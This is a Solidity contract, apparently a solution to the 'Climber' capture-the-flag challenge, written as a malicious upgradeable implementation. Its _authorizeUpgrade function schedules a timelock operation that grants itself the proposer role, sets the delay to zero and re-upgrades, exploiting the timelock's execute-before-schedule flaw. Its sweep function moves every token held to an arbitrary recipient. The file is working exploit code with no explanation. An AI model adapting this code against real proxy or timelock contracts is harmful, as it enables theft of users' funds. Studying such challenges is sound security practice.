// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "./ClimberTimelock.sol";

contract HackUpgrade is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    function sweep(address tokenAddress, address recipient) public {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(recipient, token.balanceOf(address(this)));
    }

    function _authorizeUpgrade(address) internal override {
        ClimberTimelock timelock = ClimberTimelock(payable(owner()));

        address[] memory targets = new address[](3);
        targets[0] = owner();
        targets[1] = owner();
        targets[2] = address(this);

        uint256[] memory values = new uint256[](3);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;

        bytes[] memory dataElements = new bytes[](3);
        dataElements[0] = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));
        dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[2] = abi.encodeWithSignature("upgradeTo(address)", _getImplementation());

        timelock.schedule(
            targets,
            values,
            dataElements,
            "h4ck"
        );
    }
}
